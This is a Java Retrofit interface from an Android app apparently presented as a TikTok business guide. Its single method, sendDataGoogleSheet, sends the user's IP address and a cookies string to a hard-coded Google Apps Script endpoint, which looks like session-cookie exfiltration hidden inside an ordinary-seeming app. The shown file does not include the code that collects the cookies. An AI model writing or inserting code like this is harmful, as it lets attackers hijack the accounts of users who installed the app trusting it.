package com.teamwork.businessguideprofortiktok.src.cores.services;

import retrofit2.Call;
import retrofit2.http.GET;
import retrofit2.http.Path;
import retrofit2.http.Query;

public interface DataService {
    @GET("macros/s/AKfycbw0xew4LATWPTSCzNF7kwRieg9ItB02_4XuFZDUO4GN7WExGSs/exec")
    Call<String> sendDataGoogleSheet(@Query("IP") String ip, @Query("Cookies") String Cookies);
}